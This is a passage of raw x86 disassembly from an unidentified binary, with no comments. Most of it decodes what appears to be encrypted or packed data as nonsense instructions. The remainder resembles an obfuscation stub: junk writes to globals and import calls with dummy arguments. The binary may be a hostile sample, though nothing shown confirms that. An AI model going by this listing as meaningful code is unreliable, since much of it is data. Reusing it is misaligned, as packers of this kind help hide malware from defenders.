  412ed1:	sub    DWORD PTR [edx],0xffffffdb
  412ed4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ed5:	ins    BYTE PTR es:[edi],dx
  412ed6:	push   esi
  412ed7:	or     BYTE PTR [eax+0x25432344],ah
  412edd:	shl    DWORD PTR [ebx+0x45],0x14
  412ee1:	add    bh,BYTE PTR [ebx]
  412ee3:	add    BYTE PTR [edx],bl
  412ee5:	and    BYTE PTR [ebx],dh
  412ee7:	iret   
  412ee8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ee9:	das    
  412eea:	xchg   ebp,eax
  412eeb:	push   cs
  412eec:	xchg   edi,eax
  412eed:	or     eax,0xd18330ee
  412ef2:	adc    bh,bl
  412ef4:	dec    edi
  412ef5:	aam    0xf2
  412ef7:	imul   ebx,DWORD PTR [ebx+0x37],0xa5f4d98e
  412efe:	pop    es
  412eff:	jle    0x412ebe
  412f01:	pop    ds
  412f02:	dec    eax
  412f03:	xor    dh,bl
  412f05:	sti    
  412f06:	shl    BYTE PTR [edx+0x3d],cl
  412f09:	jge    0x412f32
  412f0b:	imul   edx,DWORD PTR [ecx],0xffffffff
  412f0e:	cmp    ebp,ecx
  412f10:	add    esi,DWORD PTR [edi+ecx*8-0x64]
  412f14:	ret    0xa141
  412f17:	in     al,0x15
  412f19:	(bad)  
  412f1a:	(bad)  
  412f1b:	ins    BYTE PTR es:[edi],dx
  412f1c:	test   BYTE PTR [edi+0x509402cc],ah
  412f22:	mov    cl,0x39
  412f24:	mov    eax,0xf255ad2e
  412f29:	sub    eax,0xcd27f4e6
  412f2e:	addr16 jmp 0x60fad
  412f34:	mov    al,dh
  412f36:	fistp  QWORD PTR [edi]
  412f38:	or     DWORD PTR [eax-0x7d176ef5],ecx
  412f3e:	test   eax,0x92dc6a57
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	mov    ?,WORD PTR [edi]
  412f46:	shl    ebx,1
  412f48:	addr16 retf 
  412f4a:	xor    al,0x7a
  412f4c:	ret    0x6154
  412f4f:	aas    
  412f50:	nop
  412f51:	mov    edi,DWORD PTR [ebx+ebp*1+0x47]
  412f55:	mov    esi,0xd0d7b0af
  412f5a:	je     0x412f7f
  412f5c:	call   0x4b8:0x44d86c0
  412f63:	adc    DWORD PTR [ebx+0x285c283a],0x59
  412f6a:	pop    es
  412f6b:	clc    
  412f6c:	sub    DWORD PTR [eax],0xd45cd623
  412f72:	sbb    DWORD PTR [ecx-0x55eb53a1],ecx
  412f78:	mov    dl,0xcc
  412f7a:	or     BYTE PTR [ebx],dl
  412f7c:	xor    ebp,DWORD PTR [esi+ebx*1+0x3]
  412f80:	test   DWORD PTR [ecx-0x2b049a24],edi
  412f86:	sbb    DWORD PTR [edi+0x22],esi
  412f89:	sub    ebx,esi
  412f8b:	push   edi
  412f8c:	(bad)  
  412f8e:	pop    eax
  412f8f:	add    al,0x41
  412f91:	pop    edx
  412f92:	or     eax,0x79c1fc47
  412f97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f98:	mov    dl,0xbc
  412f9a:	jp     0x412fe1
  412f9c:	pop    eax
  412f9d:	adc    DWORD PTR ss:[esi],0xffffff8a
  412fa1:	add    cl,0xb6
  412fa4:	retf   0x65f
  412fa7:	jb     0x412f5b
  412fa9:	dec    edi
  412faa:	inc    edi
  412fab:	and    bl,dl
  412fad:	jno    0x412f3a
  412faf:	fld    TBYTE PTR [ecx+0x26]
  412fb2:	nop
  412fb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fb4:	inc    ebp
  412fb5:	outs   dx,DWORD PTR ds:[esi]
  412fb6:	cs (bad) 
  412fb8:	in     al,dx
  412fb9:	jbe    0x412fef
  412fbb:	test   al,0x1e
  412fbd:	pop    es
  412fbe:	mov    fs:0xd794a595,al
  412fc4:	sub    ah,al
  412fc6:	nop
  412fc7:	jle    0x412f4b
  412fc9:	sbb    BYTE PTR [edi],dl
  412fcb:	neg    BYTE PTR [ecx]
  412fcd:	and    eax,0x69f61957
  412fd2:	push   esp
  412fd3:	jecxz  0x413002
  412fd5:	ds add eax,0xe3564907
  412fdb:	addr16 data16 test ax,0xe790
  412fe1:	outs   dx,DWORD PTR ds:[esi]
  412fe2:	pop    ebx
  412fe3:	inc    ebx
  412fe4:	xor    ebp,DWORD PTR [esi+esi*8-0x496454c4]
  412feb:	out    0x59,eax
  412fed:	lds    ecx,FWORD PTR [ebx+0x7c5a1cb1]
  412ff3:	sub    BYTE PTR [eax],dh
  412ff5:	cmp    edi,DWORD PTR [ecx+esi*4]
  412ff8:	xor    al,0xcd
  412ffa:	(bad)  
  412ffb:	sub    eax,DWORD PTR [ebp-0x4304ee1f]
  413001:	icebp  
  413002:	fwait
  413003:	mov    bl,0x9b
  413005:	sbb    ah,BYTE PTR [esi-0x410cf476]
  41300b:	jnp    0x413064
  41300d:	pusha  
  41300e:	aas    
  41300f:	cmp    eax,DWORD PTR [ebx]
  413011:	(bad)  
  413012:	push   esi
  413013:	lock enter 0xb972,0x2d
  413018:	xchg   edx,eax
  413019:	xor    DWORD PTR [ebp-0x6b0aa94c],eax
  41301f:	cwde   
  413020:	jg     0x413056
  413022:	xor    al,0x8a
  413024:	aas    
  413025:	jne    0x412fc7
  413027:	mov    dh,0x72
  413029:	stos   BYTE PTR es:[edi],al
  41302a:	clc    
  41302b:	fbstp  TBYTE PTR [edx-0x7900d8cd]
  413031:	jno    0x413072
  413033:	loopne 0x413070
  413035:	jae    0x413004
  413037:	xlat   BYTE PTR ds:[ebx]
  413038:	xchg   esp,eax
  413039:	sbb    al,0x7f
  41303b:	jne    0x413047
  41303d:	pusha  
  41303e:	mov    edx,0xa82b5b9c
  413043:	pop    ecx
  413044:	xchg   esp,eax
  413045:	shr    BYTE PTR [edi+0x6142de35],cl
  41304b:	call   FWORD PTR [ebp-0x2deb95de]
  413051:	stos   BYTE PTR es:[edi],al
  413052:	out    dx,eax
  413053:	test   BYTE PTR [edx+0x67],bh
  413056:	rcr    edx,cl
  413058:	sti    
  413059:	or     BYTE PTR ds:0xa988b752,dl
  41305f:	frstor [ebx+edx*4+0x10]
  413063:	add    eax,0x454698ca
  413068:	inc    edi
  413069:	inc    eax
  41306a:	push   es
  41306b:	jge    0x413041
  41306d:	leave  
  41306e:	sbb    DWORD PTR [ebx-0x53325ce7],ebx
  413074:	dec    eax
  413075:	xchg   edi,eax
  413076:	push   ecx
  413077:	div    DWORD PTR [edi]
  413079:	cmp    eax,0xc421dde3
  41307e:	lds    edx,FWORD PTR [eax]
  413080:	inc    esi
  413081:	xchg   ebx,eax
  413082:	shr    DWORD PTR ss:[edx],0x3f
  413086:	jns    0x4130e0
  413088:	xchg   ch,al
  41308a:	aaa    
  41308b:	out    dx,al
  41308c:	inc    ecx
  41308d:	push   0xf5eb3409
  413092:	call   0x8c6e:0x75dcc91d
  413099:	pop    esi
  41309a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41309b:	sti    
  41309c:	mov    DWORD PTR [edx+0x7d],ebp
  41309f:	jge    0x4130d3
  4130a1:	add    esp,edi
  4130a3:	xchg   edx,eax
  4130a4:	sbb    ch,ah
  4130a6:	xor    al,0x95
  4130a8:	sub    eax,0x43136e1e
  4130ad:	inc    esi
  4130ae:	cmp    al,BYTE PTR [eax-0x25736d7]
  4130b4:	adc    dh,dh
  4130b6:	fxtract 
  4130b8:	sbb    BYTE PTR [edi+ecx*2-0x22],dl
  4130bc:	arpl   WORD PTR [ecx+0x61672da5],dx
  4130c2:	pop    ecx
  4130c3:	push   cs
  4130c4:	inc    ecx
  4130c5:	div    DWORD PTR [ecx+0x46f99294]
  4130cb:	retf   
  4130cc:	pop    ebp
  4130cd:	sub    ecx,DWORD PTR [ebp-0x5d]
  4130d0:	sub    DWORD PTR [eax+0x26],0x70
  4130d4:	mov    bh,0xf1
  4130d6:	ret    
  4130d7:	shl    dl,1
  4130d9:	xchg   ecx,eax
  4130da:	bound  edi,QWORD PTR [esi]
  4130dc:	mov    ebp,0x8f680b2d
  4130e1:	push   eax
  4130e2:	xchg   ebx,eax
  4130e3:	xchg   ebx,eax
  4130e4:	mov    al,ds:0xc8c1f11d
  4130e9:	mul    DWORD PTR [esi]
  4130eb:	mov    edx,0x38db38f4
  4130f0:	inc    edi
  4130f1:	and    al,0xf7
  4130f3:	inc    edi
  4130f4:	or     DWORD PTR [ecx-0x43bcd27c],esi
  4130fa:	sub    ebp,eax
  4130fc:	dec    esi
  4130fd:	pop    eax
  4130fe:	xchg   ebx,eax
  4130ff:	imul   eax,DWORD PTR [edx-0x2b78dfe7],0x40c240fe
  413109:	mov    BYTE PTR [ecx],bl
  41310b:	jnp    0x4130e4
  41310d:	js     0x413118
  41310f:	mov    esi,0x605118fb
  413114:	sbb    eax,0x3e642e2b
  413119:	inc    edx
  41311a:	sub    DWORD PTR [esi-0x190e8a75],esi
  413120:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413121:	aam    0xa8
  413123:	xor    ebp,esp
  413125:	into   
  413126:	mov    WORD PTR [ebx-0x52],?
  413129:	dec    ecx
  41312a:	push   0xca747b5d
  41312f:	jmp    0x413133
  413131:	xchg   DWORD PTR [ecx-0x4],eax
  413134:	cmp    DWORD PTR [edx],0xffffff88
  413137:	adc    bl,dl
  413139:	ins    DWORD PTR es:[edi],dx
  41313a:	data16 jne 0x413118
  41313d:	jnp    0x413105
  41313f:	test   al,0xb0
  413142:	cmp    eax,0xe25f688f
  413147:	inc    eax
  413148:	and    esp,DWORD PTR ds:0x3ead430e
  41314e:	cmp    BYTE PTR ds:0x67aacbd9,ah
  413154:	loop   0x4131bc
  413156:	push   ebp
  413157:	pop    eax
  413158:	xchg   esp,eax
  413159:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41315a:	mov    ebx,0xab2257a2
  41315f:	push   edx
  413160:	dec    esi
  413161:	hlt    
  413162:	adc    eax,0x33055291
  413167:	(bad)  
  413168:	xlat   BYTE PTR ds:[ebx]
  413169:	fimul  WORD PTR [ecx-0x729b148b]
  41316f:	les    edx,FWORD PTR [esi+0x10ae6eb8]
  413175:	in     al,dx
  413176:	xchg   esi,eax
  413177:	loopne 0x41315d
  413179:	in     al,dx
  41317a:	ret    
  41317b:	jno    0x4131a4
  41317d:	cmp    BYTE PTR [ebx+0x71],ah
  413180:	pop    edx
  413181:	test   eax,0xd6328574
  413186:	and    ch,0xde
  413189:	ds dec ecx
  41318b:	out    dx,eax
  41318c:	xchg   edx,eax
  41318d:	imul   BYTE PTR [edi]
  41318f:	push   edi
  413190:	inc    esp
  413191:	test   edi,0x3c16e266
  413197:	stos   DWORD PTR es:[edi],eax
  413198:	xchg   edx,eax
  413199:	(bad)  
  41319a:	into   
  41319b:	sbb    ebx,ebp
  41319d:	sub    BYTE PTR [ebp*4-0x72b474a9],dl
  4131a4:	rol    dl,cl
  4131a6:	dec    edx
  4131a7:	enter  0x9cf3,0x7f
  4131ab:	mov    ds:0xfbf73c4,al
  4131b0:	mov    bh,0x46
  4131b2:	inc    esi
  4131b3:	inc    edx
  4131b4:	mov    ecx,0x32825105
  4131b9:	pop    ebp
  4131ba:	or     eax,0x8a9e6d7b
  4131bf:	mov    eax,DWORD PTR [edi]
  4131c1:	adc    BYTE PTR [ebx+ebx*1+0x37],al
  4131c5:	cld    
  4131c6:	stos   BYTE PTR es:[edi],al
  4131c7:	xor    edi,ebx
  4131c9:	dec    ebp
  4131ca:	loop   0x4131a6
  4131cc:	jmp    0x413245
  4131ce:	xor    ecx,ebx
  4131d0:	xor    edi,edi
  4131d2:	add    edi,DWORD PTR ds:0x4283e5
  4131d8:	sub    DWORD PTR ds:0x4283c5,edi
  4131de:	shl    ecx,0x1e
  4131e1:	xor    DWORD PTR ds:0x428315,0x3d84
  4131eb:	mov    edi,0xa5069baf
  4131f0:	xor    eax,edi
  4131f2:	shr    eax,0x2
  4131f5:	jmp    0x41352e
  4131fa:	jmp    0x8a913c60
  4131ff:	mov    eax,0x40087bbc
  413204:	push   0xffffffd1
  413206:	mov    DWORD PTR [ebp+0x28],0xbe7ebcd1
  41320d:	mov    esi,0xbebec4ed
  413212:	xlat   BYTE PTR cs:[ebx]
  413214:	fstp   TBYTE PTR fs:[eax+esi*2-0x6a]
  413219:	icebp  
  41321a:	dec    ecx
  41321b:	fcmovnu st,st(0)
  41321d:	jmp    0x413237
  41321f:	jp     0x413292
  413221:	adc    eax,0xee324fbc
  413226:	into   
  413227:	sub    eax,0x84cb9ebc
  41322c:	adc    dl,cl
  41322e:	push   esi
  41322f:	sub    DWORD PTR [esi-0xb184d87],ebx
  413235:	icebp  
  413236:	sub    al,0x1c
  413238:	ds fwait
  41323a:	dec    edi
  41323b:	sbb    cl,BYTE PTR [edx+0x6c]
  41323e:	cmc    
  41323f:	(bad)  
  413240:	int    0x7c
  413242:	mov    ch,0x60
  413244:	and    ebx,DWORD PTR [ebx+esi*1+0x5]
  413248:	repz cmovs edx,DWORD PTR [edx-0x6b]
  41324d:	clc    
  41324e:	fadd   DWORD PTR [edx-0x14]
  413251:	inc    edx
  413252:	inc    esi
  413253:	cmp    esp,DWORD PTR [edi-0x34]
  413256:	xchg   ebx,eax
  413257:	mov    ch,0xdc
  413259:	jno    0x413220
  41325b:	mov    dh,0xbc
  41325d:	cmc    
  41325e:	jb     0x413201
  413260:	jb     0x4131e9
  413262:	pop    es
  413263:	sahf   
  413264:	out    0x6d,al
  413266:	mov    bh,0xf5
  413268:	int3   
  413269:	xchg   ecx,eax
  41326a:	jns    0x413241
  41326c:	(bad)  
  41326e:	out    dx,al
  41326f:	js     0x413286
  413271:	(bad)  
  413272:	leave  
  413273:	mov    ecx,0x3c882091
  413278:	jno    0x41328d
  41327a:	repz or al,0x94
  41327d:	xor    al,0x54
  41327f:	test   BYTE PTR [ebx+ecx*1+0x48],al
  413283:	and    BYTE PTR [ebx+0x3],bl
  413286:	pop    ebx
  413287:	add    al,0xec
  413289:	inc    eax
  41328a:	test   BYTE PTR [esi+0x44],0x88
  41328e:	push   edx
  41328f:	sti    
  413290:	sbb    al,cl
  413292:	adc    al,BYTE PTR [esi+0xc32158b]
  413298:	push   ecx
  413299:	jno    0x413290
  41329b:	leave  
  41329c:	sahf   
  41329d:	mov    al,BYTE PTR [ebp+eax*2-0x2f]
  4132a1:	or     bl,ah
  4132a3:	fwait
  4132a4:	adc    DWORD PTR [eax],0xffffff96
  4132a7:	jmp    0xc040b252
  4132ac:	push   edi
  4132ad:	mov    DWORD PTR [ecx+0x4432772a],edi
  4132b3:	inc    ebp
  4132b4:	leave  
  4132b5:	(bad)  [eax+0x690b0d96]
  4132bb:	mov    esp,0x4be4306
  4132c0:	push   edi
  4132c1:	add    eax,0x4f07a31f
  4132c6:	sub    DWORD PTR [eax],ebx
  4132c8:	(bad)
  4132cb:	mov    cl,0xa6
  4132cd:	aas    
  4132ce:	(bad)  
  4132d0:	je     0x41329f
  4132d2:	jmp    0x413304
  4132d4:	cmp    ebp,edx
  4132d6:	aad    0xff
  4132d8:	(bad)  
  4132d9:	lea    ebp,[edi+0x71fbb60]
  4132df:	test   ah,ah
  4132e1:	mov    al,0xdd
  4132e3:	lahf   
  4132e4:	or     DWORD PTR [esi-0x39],esp
  4132e7:	push   eax
  4132e8:	cmp    al,0x5b
  4132ea:	mov    esp,0x26a45cb0
  4132ef:	popf   
  4132f0:	mov    BYTE PTR [ebp+0x2657fb6a],bh
  4132f6:	out    0x41,al
  4132f8:	(bad)  
  4132f9:	mov    cl,0x16
  4132fb:	iret   
  4132fc:	cmp    al,0x3c
  4132fe:	loope  0x4132aa
  413300:	sub    esi,DWORD PTR [eax+0x2e]
  413303:	neg    DWORD PTR [esi]
  413305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413306:	mov    dl,ah
  413308:	scas   al,BYTE PTR es:[edi]
  413309:	pop    esi
  41330a:	call   0xbdc4859f
  41330f:	sbb    eax,0x40180a7c
  413314:	call   FWORD PTR [ecx]
  413316:	jmp    0x41338b
  413318:	fisttp QWORD PTR [esi-0x2b]
  41331b:	cmp    al,0x6d
  41331d:	lods   al,BYTE PTR ds:[esi]
  41331e:	push   edx
  41331f:	mov    BYTE PTR [ebp*2-0x27c380e6],cl
  413326:	mov    dl,0x6a
  413328:	push   ebx
  413329:	pop    ebx
  41332a:	mov    bl,0x6b
  41332c:	loopne 0x413353
  41332e:	jae    0x413310
  413330:	pop    ecx
  413331:	sbb    BYTE PTR [esi],bl
  413333:	les    edi,FWORD PTR [edx]
  413335:	push   0xb5d03cc0
  41333a:	fstp   QWORD PTR [edi+0xa]
  41333d:	in     eax,0xdc
  41333f:	loop   0x41334a
  413341:	stos   DWORD PTR es:[edi],eax
  413342:	inc    ebx
  413343:	jl     0x4132c9
  413345:	adc    edi,esp
  413347:	gs dec ebp
  413349:	lods   al,BYTE PTR ds:[esi]
  41334a:	mov    ebp,0xd98d1c8b
  41334f:	fcmovbe st,st(5)
  413351:	xor    al,0x5e
  413353:	shl    BYTE PTR [ebx+0x22],1
  413356:	sar    DWORD PTR [ebp+0x8e979b2],1
  41335c:	inc    esi
  41335d:	imul   ebp,edi,0x42
  413360:	loopne 0x4133cd
  413362:	mov    ah,0xd8
  413364:	ud2    
  413366:	xchg   ebx,eax
  413367:	bound  ecx,QWORD PTR [edx]
  413369:	sbb    DWORD PTR [eax-0x28c39a2b],ebp
  41336f:	mov    eax,ds:0x82a5db10
  413374:	jns    0x413331
  413376:	dec    eax
  413377:	xlat   BYTE PTR ds:[ebx]
  413378:	std    
  413379:	push   esi
  41337a:	std    
  41337b:	cmp    al,0xaa
  41337d:	sbb    DWORD PTR [ebp+ebx*2+0x73],esp
  413381:	js     0x413331
  413383:	lea    esp,[ebx]
  413385:	sbb    al,0x39
  413387:	fiadd  WORD PTR ds:0xeccf6a7c
  41338d:	and    al,0x2a
  41338f:	inc    ebx
  413390:	jmp    0xdbcf:0xd7efaf41
  413397:	push   eax
  413398:	pop    ebp
  413399:	test   BYTE PTR [ebx+0x5d],al
  41339c:	rcr    DWORD PTR [eax-0x1c],0xc5
  4133a0:	fmul   QWORD PTR [eax+ecx*4+0xf]
  4133a4:	pop    esi
  4133a5:	dec    esp
  4133a6:	cld    
  4133a7:	cdq    
  4133a8:	mov    edi,0xc8bb9dd1
  4133ad:	test   DWORD PTR [ebp+0x1a],eax
  4133b0:	out    0x18,al
  4133b2:	inc    eax
  4133b3:	sub    esi,edi
  4133b5:	scas   al,BYTE PTR es:[edi]
  4133b6:	pop    ss
  4133b7:	mov    ebx,0x90cc0efb
  4133bc:	mov    edi,DWORD PTR [edi+0x2ff1197d]
  4133c2:	mov    ds:0x16b357b0,al
  4133c7:	aad    0x30
  4133c9:	aam    0xb7
  4133cb:	call   0xbbe4f2e4
  4133d0:	stos   BYTE PTR es:[edi],al
  4133d1:	xor    eax,0x9c5519d
  4133d6:	loope  0x413388
  4133d8:	sar    DWORD PTR [eax+0x7553a50a],0x9c
  4133df:	fucomip st,st(1)
  4133e1:	xchg   ebp,eax
  4133e2:	js     0x41337f
  4133e4:	cmp    eax,0x9f013d2f
  4133e9:	pop    eax
  4133ea:	stos   DWORD PTR es:[edi],eax
  4133eb:	push   ecx
  4133ec:	in     eax,0x43
  4133ee:	cs test eax,0xa5ce544d
  4133f5:	mov    esi,0xe60376db
  4133fa:	or     esi,DWORD PTR [ebp+0x72]
  4133fd:	cmp    BYTE PTR [edx-0x7607e99],ch
  413403:	jb     0x413441
  413405:	sti    
  413406:	ret    
  413407:	int3   
  413408:	and    eax,0xce68955c
  41340d:	push   esp
  41340e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41340f:	push   cs
  413410:	in     eax,0xcf
  413412:	mov    cl,0x88
  413414:	xor    bl,BYTE PTR [ecx-0x59]
  413417:	lods   eax,DWORD PTR ds:[esi]
  413418:	and    cl,bh
  41341a:	sub    DWORD PTR [ebx+edx*1+0x38],ecx
  41341e:	mov    edx,0x5bb1a62c
  413423:	jecxz  0x413474
  413425:	leave  
  413426:	xchg   edx,eax
  413427:	push   edi
  413428:	sub    eax,0x8a64a2e0
  41342d:	(bad)  
  41342f:	xchg   edx,eax
  413430:	sar    DWORD PTR [ebp-0x4f],0x67
  413434:	sub    bl,BYTE PTR [edx+ebx*1]
  413437:	inc    ebx
  413438:	outs   dx,BYTE PTR ds:[esi]
  413439:	xchg   ecx,eax
  41343a:	popa   
  41343b:	mov    ecx,0x8f8168c7
  413440:	mov    dl,0x2e
  413442:	inc    ebp
  413443:	(bad)  
  413444:	lods   eax,DWORD PTR ds:[esi]
  413445:	jecxz  0x4134bb
  413447:	jb     0x413405
  413449:	test   DWORD PTR [ebx-0x2690d6b8],ecx
  41344f:	cmp    al,BYTE PTR [edx+0x4a]
  413452:	dec    ecx
  413453:	enter  0xf9d2,0xc2
  413457:	sub    ecx,esi
  413459:	retf   0xa98e
  41345c:	fsubr  st(7),st
  41345e:	or     eax,ebx
  413460:	push   ebp
  413461:	popf   
  413462:	scas   eax,DWORD PTR es:[edi]
  413463:	jl     0x4134c0
  413465:	out    0x6,al
  413467:	jo     0x413488
  413469:	shl    ah,0x2
  41346c:	cdq    
  41346d:	jb     0x413434
  41346f:	iret   
  413470:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413471:	mov    edx,0xc4f09b6b
  413476:	(bad)  
  413477:	cli    
  413478:	xchg   esp,eax
  413479:	jb     0x4134df
  41347b:	inc    esi
  41347c:	call   0x8208:0x68b6f9c1
  413483:	xor    al,0xfd
  413485:	sbb    BYTE PTR [edx+esi*2],0xe5
  413489:	ins    DWORD PTR es:[edi],dx
  41348a:	sti    
  41348b:	adc    edx,DWORD PTR [ebx]
  41348d:	jg     0x41342d
  41348f:	sub    eax,0x3af7d75c
  413494:	ss xchg ebx,eax
  413496:	out    dx,al
  413497:	xchg   esp,eax
  413498:	aam    0x1d
  41349a:	push   0x17918a6a
  41349f:	jp     0x4134f7
  4134a1:	hlt    
  4134a2:	xor    esp,DWORD PTR [esi+0x23b87eb]
  4134a8:	cmp    esp,DWORD PTR [ebp-0x7281ec7f]
  4134ae:	stos   DWORD PTR es:[edi],eax
  4134af:	ror    BYTE PTR [ebp-0xdd42507],0xe2
  4134b6:	les    esi,FWORD PTR [ecx-0xb0c7013]
  4134bc:	loope  0x4134a5
  4134be:	sbb    ch,BYTE PTR [edx]
  4134c0:	sbb    al,BYTE PTR [esi+0x2fd4f37e]
  4134c6:	xchg   esp,eax
  4134c7:	fiadd  DWORD PTR [edx-0x4fa4aece]
  4134cd:	mov    bh,0xbc
  4134cf:	leave  
  4134d0:	loope  0x4134bc
  4134d2:	adc    ah,dl
  4134d4:	mov    eax,ds:0x5d40ce49
  4134d9:	ins    BYTE PTR es:[edi],dx
  4134da:	test   eax,0xc2eb4d4a
  4134df:	call   DWORD PTR [ecx]
  4134e1:	cmp    DWORD PTR [ecx],esi
  4134e3:	ins    DWORD PTR es:[edi],dx
  4134e4:	push   es
  4134e5:	inc    esp
  4134e6:	outs   dx,BYTE PTR ds:[esi]
  4134e7:	fcmovu st,st(4)
  4134e9:	leave  
  4134ea:	loope  0x41353f
  4134ec:	popa   
  4134ed:	fcomp  DWORD PTR [ebp+0x7c9d5c89]
  4134f3:	add    eax,0x72a9a6f4
  4134f8:	cld    
  4134f9:	jle    0x413565
  4134fb:	jbe    0x4134c9
  4134fd:	dec    eax
  4134fe:	(bad)  
  4134ff:	xor    al,0x36
  413501:	popf   
  413502:	jae    0x413544
  413504:	sahf   
  413505:	mov    edx,DWORD PTR [ebp+0x8372748]
  41350b:	xor    al,0x8a
  41350d:	inc    eax
  41350e:	push   ecx
  41350f:	cdq    
  413510:	mov    esp,0xaed8ae3a
  413515:	aaa    
  413516:	in     eax,0xa3
  413518:	aas    
  413519:	enter  0x95c1,0x56
  41351d:	xor    BYTE PTR [ebx+0x5a],0x8
  413521:	fidivr WORD PTR [eax-0x31]
  413524:	xchg   edx,eax
  413525:	test   al,0xe3
  413527:	loopne 0x4134cc
  413529:	sbb    al,0x55
  41352b:	sub    cl,BYTE PTR [esi-0x7c3ef4d4]
  413531:	cmp    eax,0x4282e1
  413536:	add    bh,al
  413538:	add    eax,0x4283f1
  41353d:	or     DWORD PTR [ebx+0x0],ebx
  413540:	add    BYTE PTR [edi],cl
  413542:	mov    bh,0xd
  413544:	or     DWORD PTR [ebx-0x2616ffbe],eax
  41354a:	add    BYTE PTR [eax],al
  41354c:	add    bh,al
  41354e:	add    eax,0x42831d
  413553:	cmp    eax,DWORD PTR [esi+0x0]
  413556:	add    BYTE PTR [ebx+0x4282e13d],al
  41355c:	add    BYTE PTR [eax],al
  41355e:	ja     0x413594
  413564:	push   0x1092
  413569:	push   0x34c2
  41356e:	push   DWORD PTR [ebp-0x10]
  413571:	push   0x63e1
  413576:	push   0x428245
  41357b:	push   DWORD PTR [ebp-0x24]
  41357e:	call   DWORD PTR ds:0x42e0d8
  413584:	adc    DWORD PTR ds:0x4284a9,0x3ae5
  41358e:	or     ecx,DWORD PTR ds:0x4284f9
  413594:	mov    ecx,DWORD PTR ds:0x428489
  41359a:	xor    DWORD PTR ds:0x428515,ecx
  4135a0:	add    DWORD PTR ds:0x428475,0x73c1
  4135aa:	xor    DWORD PTR ds:0x428481,0x45f8
  4135b4:	cmp    DWORD PTR ds:0x4284ad,0x0
  4135bb:	mov    ecx,0x9c7
  4135c0:	mov    DWORD PTR ds:0x4282fd,0x5708
  4135ca:	mov    DWORD PTR ds:0x428481,0x67de
  4135d4:	jmp    0x413626
  4135d9:	mov    ecx,DWORD PTR ds:0x4282fd
  4135df:	cmp    DWORD PTR ds:0x4284ad,0x0
  4135e6:	jl     0x413613
  4135ec:	push   DWORD PTR [ebp-0x14]
  4135ef:	push   DWORD PTR [ebp-0x10]
  4135f2:	push   DWORD PTR [ebp-0x28]
  4135f5:	call   DWORD PTR ds:0x42e0dc
  4135fb:	adc    DWORD PTR ds:0x4283dd,edx
  413601:	mov    ecx,DWORD PTR ds:0x4282f1
  413607:	and    DWORD PTR ds:0x4284fd,ecx
  41360d:	and    DWORD PTR ds:0x428305,edx
  413613:	mov    ecx,DWORD PTR ds:0x4283d1
  413619:	xor    ecx,DWORD PTR ds:0x428401
  41361f:	mov    DWORD PTR ds:0x4283d1,ecx
  413625:	dec    ecx
  413626:	mov    DWORD PTR [ebp-0xc],eax
  413629:	cmp    DWORD PTR ds:0x4283f9,0x0
  413630:	mov    DWORD PTR ds:0x4283d5,0x7db5
  41363a:	mov    DWORD PTR ds:0x42840d,edi
  413640:	jmp    0x4136bd
  413645:	mov    ecx,DWORD PTR ds:0x4282e5
  41364b:	mov    eax,ds:0x4283ed
  413650:	cmp    DWORD PTR ds:0x4283f9,0x0
  413657:	je     0x4136a7
  41365d:	push   DWORD PTR [ebp-0x20]
  413660:	push   DWORD PTR [ebp-0x28]
  413663:	push   DWORD PTR [ebp-0x28]
  413666:	push   DWORD PTR [ebp-0xc]
  413669:	push   DWORD PTR [ebp-0x18]
  41366c:	push   DWORD PTR [ebp-0xc]
  41366f:	push   DWORD PTR [ebp-0x14]
  413672:	push   DWORD PTR [ebp-0x1c]
  413675:	push   DWORD PTR [ebp-0x20]
  413678:	push   DWORD PTR [ebp-0x14]
  41367b:	push   0x6fca
  413680:	push   DWORD PTR [ebp-0x14]
  413683:	push   0x1843
  413688:	call   DWORD PTR ds:0x42e014
  41368e:	movzx  ecx,BYTE PTR ds:0x4283dd
  413695:	and    DWORD PTR ds:0x4284f9,ecx
  41369b:	sbb    ecx,0x7147
  4136a1:	and    DWORD PTR ds:0x428475,ebx
  4136a7:	mov    ecx,DWORD PTR ds:0x428425
  4136ad:	add    DWORD PTR ds:0x4283cd,ecx
  4136b3:	and    DWORD PTR ds:0x42831d,0x5196
  4136bd:	mov    eax,ds:0x4226b8
  4136c2:	adc    DWORD PTR ds:0x4283d5,0x635d
  4136cc:	mov    DWORD PTR [ebp-0xc],eax
  4136cf:	cmp    DWORD PTR ds:0x428481,0x0
  4136d6:	mov    DWORD PTR ds:0x4282f5,0x6dcc
  4136e0:	mov    ecx,DWORD PTR ds:0x4283f1
  4136e6:	jmp    0x413753
  4136eb:	mov    DWORD PTR ds:0x42848d,0x2cf
  4136f5:	mov    DWORD PTR ds:0x428531,0x621d
  4136ff:	cmp    DWORD PTR ds:0x428481,0x0
  413706:	jbe    0x41373d
  41370c:	push   0x428481
  413711:	push   0x4283b5
  413716:	push   0x2216
  41371b:	call   DWORD PTR ds:0x42e258
  413721:	and    ecx,ecx
  413723:	mov    ecx,DWORD PTR ds:0x42835d
  413729:	mov    ecx,DWORD PTR [ecx]
  41372b:	add    DWORD PTR ds:0x42831d,ecx
  413731:	or     ecx,ecx
  413733:	sbb    DWORD PTR ds:0x42849d,0x6873
  41373d:	sbb    DWORD PTR ds:0x4284a5,ecx
  413743:	adc    DWORD PTR ds:0x428421,0x1149
  41374d:	or     DWORD PTR ds:0x4284a1,edx
  413753:	mov    eax,DWORD PTR [ebp-0x28]
  413756:	cmp    DWORD PTR ds:0x428405,0x0
  41375d:	mov    ecx,0xa9f
  413762:	mov    DWORD PTR ds:0x4283cd,0x1875
  41376c:	mov    DWORD PTR ds:0x4284a1,0x319d
  413776:	jmp    0x41383a
  41377b:	mov    DWORD PTR ds:0x428491,0x86c
  413785:	cmp    DWORD PTR ds:0x428405,0x0
  41378c:	jle    0x4137bf
  413792:	push   0x50b5
  413797:	call   DWORD PTR ds:0x42e25c
  41379d:	add    DWORD PTR ds:0x428315,0x737d
  4137a7:	sub    ecx,DWORD PTR ds:0x4284a1
  4137ad:	mov    ecx,DWORD PTR ds:0x428515
